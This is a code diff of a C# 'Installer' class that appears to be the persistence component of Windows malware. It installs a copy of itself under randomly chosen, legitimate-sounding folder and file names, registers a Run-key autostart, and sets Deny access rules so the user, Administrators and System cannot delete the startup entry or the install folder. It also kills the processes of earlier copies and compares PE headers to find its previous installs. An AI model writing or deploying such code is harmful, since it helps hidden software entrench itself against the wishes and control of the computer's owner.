@@ -6,10 +6,11 @@ using System.Runtime.InteropServices;
 using System.Reflection;
 using Microsoft.Win32;
 using System.Diagnostics;
+using System.ComponentModel;
 
 namespace A
 {
-    public class Installer
+    unsafe public class Installer
     {
         private static string[] FileNames = { "Solution", "Project", "Wireless", "Certificate", "Host",
                                               "Driver", "Process", "Build", "Windows", "Interface",
@@ -21,23 +22,71 @@ namespace A
         [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
         private static extern bool DeleteFile(string lpFileName);
 
+        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
+        private static extern int memcmp(byte[] b1, byte[] b2, long count);
+
         public static void InstallFile()
         {
             string InstallRoot = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
 
-            // Remove Duplicates
+            // remove any misc. previous installations
             foreach (string _previousInstall in Directory.GetDirectories(InstallRoot))
             {
-                if (_previousInstall.Contains("Config_Cache_"))
-                    DeleteDirectory(_previousInstall);
+
+                // if we are already installed -> reintall run once key but nothing else
+                if (Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) == _previousInstall)
+                {
+                    string[] _childrenFiles = Directory.GetFiles(_previousInstall);
+                    if (_childrenFiles.Length > 0)
+                        CreateRegistryEntry(_childrenFiles[0]);
+                    return;
+                }
+
+                // search for any previous installations and remove them
+                if (_previousInstall.Contains("Config Cache"))
+                {
+                    bool marker1 = false;
+                    bool marker2 = false;
+
+                    foreach (string _fileName in FileNames)
+                    {
+                        if (_previousInstall.Contains(_fileName))
+                        {
+                            if (marker1)
+                                marker2 = true;
+                            else
+                                marker1 = true;
+                        }
+                    }
+
+                    // ensure that it is a directory made by us &&
+                    // then read the file's content to see if it == to our current (if so, then delete)
+                    if (marker1 && marker2)
+                    {
+                        // read self into byte array to compare
+                        byte[] bufferSelfHdrs = ReadPEHeaders(Assembly.GetEntryAssembly().Location);
+
+                        foreach (string _fileName in Directory.GetFiles(_previousInstall))
+                        {
+                            byte[] bufferChildHdrs = ReadPEHeaders(_fileName);
+
+                            if (bufferSelfHdrs.Length == bufferChildHdrs.Length && memcmp(bufferSelfHdrs, bufferChildHdrs, bufferSelfHdrs.Length) == 0)
+                            {
+                                // if we have found a bad installation of ourself, we can delete it
+                                DeleteDirectory(_previousInstall);
+                                DeleteStartupEntry(_previousInstall);
+                            }
+                        }
+                    }
+                }
             }
 
             // Directory
-            string InstallDirectoryName = string.Format("{0} {1} Config_Cache_", FileNames[Rand.Next(0, FileNames.Length)], FileNames[Rand.Next(0, FileNames.Length)]);
+            string InstallDirectoryName = string.Format("{0} {1} Config Cache {2}", FileNames[Rand.Next(0, FileNames.Length)], FileNames[Rand.Next(0, FileNames.Length)], Rand.Next(0, 100000));
             string InstallDirectoryPath = string.Concat(InstallRoot, "\\", InstallDirectoryName);
 
             // File
-            string InstallFileName = string.Format("{0}_{1}.exe", FileNames[Rand.Next(0, FileNames.Length)], FileNames[Rand.Next(0, FileNames.Length)]);
+            string InstallFileName = string.Format("{0} {1}.exe", FileNames[Rand.Next(0, FileNames.Length)], FileNames[Rand.Next(0, FileNames.Length)]);
             string InstallFilePath = string.Concat(InstallDirectoryPath, "\\", InstallFileName);
 
             // Init
@@ -46,39 +95,69 @@ namespace A
             CreateRegistryEntry(InstallFilePath);
         }
 
-        private static void CreateRegistryEntry(string InstallFilePath)
+        private static byte[] ReadPEHeaders(string FilePath)
         {
-            RegistryKey regKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", true);
+            byte[] bufferSelfHdrs = null;
 
-            regKey.SetValue("Driver Interface", string.Format("\"{0}\"", InstallFilePath));
-            regKey.Close();
+            using (FileStream fs = new FileStream(FilePath, FileMode.Open, FileAccess.Read, FileShare.Read))
+            {
+                using (BinaryReader rdr = new BinaryReader(fs))
+                {
+                    rdr.ReadBytes(0x3c);
+                    int e_lfanew = rdr.ReadInt32();
+                    rdr.BaseStream.Position = 0;
+                    rdr.ReadBytes(e_lfanew);
+                    rdr.ReadBytes(0x54);
+                    int sizeOfHeaders = rdr.ReadInt32();
+                    rdr.BaseStream.Position = 0;
+                    bufferSelfHdrs = rdr.ReadBytes(sizeOfHeaders);
+                }
+            }
 
-            ProtectStartupKey();
+            return bufferSelfHdrs;
         }
 
-        private static void ProtectStartupKey()
+        private static void CreateRegistryEntry(string InstallFilePath)
         {
-            RegistryKey regKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", true);
+            // unique registry key name is the directory name of the install file
+            RegistryKey regKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+
+            regKey.SetValue(Path.GetFileName(Path.GetDirectoryName(InstallFilePath)), string.Format("\"{0}\"", InstallFilePath));
+            regKey.Close();
+
+            ProtectStartupEntry();
+        }
+
+        private static void DeleteStartupEntry(string InstallDirectoryPath)
+        {
+            UnProtectStartupEntry();
+
+            RegistryKey regKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+
+            regKey.DeleteValue(Path.GetFileName(InstallDirectoryPath), true);
+            regKey.Close();
+        }
+
+        private static void ProtectStartupEntry()
+        {
+            RegistryKey regKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
 
             RegistrySecurity regSec = regKey.GetAccessControl();
 
             RegistryAccessRule regAccessUser = new RegistryAccessRule(CurrentUser,
-                                                        RegistryRights.ChangePermissions | RegistryRights.CreateSubKey | RegistryRights.Delete |
-                                                        RegistryRights.SetValue | RegistryRights.TakeOwnership | RegistryRights.WriteKey,
+                                                          RegistryRights.Delete | RegistryRights.SetValue,
                                                         InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                         PropagationFlags.None,
                                                         AccessControlType.Deny);
 
             RegistryAccessRule regAccessAdmin = new RegistryAccessRule("Administrators",
-                                                       RegistryRights.ChangePermissions | RegistryRights.CreateSubKey | RegistryRights.Delete |
-                                                       RegistryRights.SetValue | RegistryRights.TakeOwnership | RegistryRights.WriteKey,
+                                                      RegistryRights.Delete | RegistryRights.SetValue,
                                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                        PropagationFlags.None,
                                                        AccessControlType.Deny);
 
             RegistryAccessRule regAccessSystem = new RegistryAccessRule("System",
-                                                     RegistryRights.ChangePermissions | RegistryRights.CreateSubKey | RegistryRights.Delete |
-                                                     RegistryRights.SetValue | RegistryRights.TakeOwnership | RegistryRights.WriteKey,
+                                                       RegistryRights.Delete | RegistryRights.SetValue,
                                                      InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                      PropagationFlags.None,
                                                      AccessControlType.Deny);
@@ -90,29 +169,26 @@ namespace A
             regKey.SetAccessControl(regSec);
         }
 
-        private static void UnProtectStartupKey()
+        private static void UnProtectStartupEntry()
         {
-            RegistryKey regKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", true);
+            RegistryKey regKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions);
 
             RegistrySecurity regSec = regKey.GetAccessControl();
 
             RegistryAccessRule regAccessUser = new RegistryAccessRule(CurrentUser,
-                                                        RegistryRights.ChangePermissions | RegistryRights.CreateSubKey | RegistryRights.Delete |
-                                                        RegistryRights.SetValue | RegistryRights.TakeOwnership | RegistryRights.WriteKey,
+                                                        RegistryRights.Delete | RegistryRights.SetValue,
                                                         InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                         PropagationFlags.None,
                                                         AccessControlType.Deny);
 
             RegistryAccessRule regAccessAdmin = new RegistryAccessRule("Administrators",
-                                                       RegistryRights.ChangePermissions | RegistryRights.CreateSubKey | RegistryRights.Delete |
-                                                       RegistryRights.SetValue | RegistryRights.TakeOwnership | RegistryRights.WriteKey,
+                                                       RegistryRights.Delete | RegistryRights.SetValue,
                                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                        PropagationFlags.None,
                                                        AccessControlType.Deny);
 
             RegistryAccessRule regAccessSystem = new RegistryAccessRule("System",
-                                                     RegistryRights.ChangePermissions | RegistryRights.CreateSubKey | RegistryRights.Delete |
-                                                     RegistryRights.SetValue | RegistryRights.TakeOwnership | RegistryRights.WriteKey,
+                                                     RegistryRights.Delete | RegistryRights.SetValue,
                                                      InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                      PropagationFlags.None,
                                                      AccessControlType.Deny);
@@ -166,7 +242,7 @@ namespace A
             UnknownError = -1,
             DoesNotExist = 0,
             Success = 1,
-            ActiveProcess
+            ActiveProcess = 2
         }
 
         private static DeletionStatus DeleteDirectory(string DirectoryPath)
@@ -184,9 +260,13 @@ namespace A
                     {
                         _childProcess.Kill();
                     }
-                    catch (Exception)
+                    catch (Win32Exception)
                     {
                         return DeletionStatus.ActiveProcess;
+                    }
+                    catch (Exception)
+                    {
+                        return DeletionStatus.UnknownError;
                     }
                 }
             }
@@ -206,19 +286,19 @@ namespace A
             DirectorySecurity dirSec = dirInfo.GetAccessControl();
 
             dirSec.AddAccessRule(new FileSystemAccessRule(CurrentUser,
-                                        FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Write | FileSystemRights.Read,
+                                        FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles,
                                         InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                         PropagationFlags.None,
                                         AccessControlType.Deny));
 
             dirSec.AddAccessRule(new FileSystemAccessRule("Administrators",
-                                        FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Write | FileSystemRights.Read,
+                                           FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles,
                                         InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                         PropagationFlags.None,
                                         AccessControlType.Deny));
 
             dirSec.AddAccessRule(new FileSystemAccessRule("System",
-                                       FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Write | FileSystemRights.Read,
+                                        FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles,
                                         InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                         PropagationFlags.None,
                                         AccessControlType.Deny));
@@ -233,19 +313,19 @@ namespace A
             DirectorySecurity dirSec = dirInfo.GetAccessControl();
 
             dirSec.RemoveAccessRule(new FileSystemAccessRule(CurrentUser,
-                                        FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Write | FileSystemRights.Read,
+                                       FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles,
                                         InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                         PropagationFlags.None,
                                         AccessControlType.Deny));
 
             dirSec.RemoveAccessRule(new FileSystemAccessRule("Administrators",
-                                        FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Write | FileSystemRights.Read,
+                                FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles,
                                         InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                         PropagationFlags.None,
                                         AccessControlType.Deny));
 
             dirSec.RemoveAccessRule(new FileSystemAccessRule("System",
-                                       FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Write | FileSystemRights.Read,
+                                       FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles,
                                         InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                         PropagationFlags.None,
                                         AccessControlType.Deny));
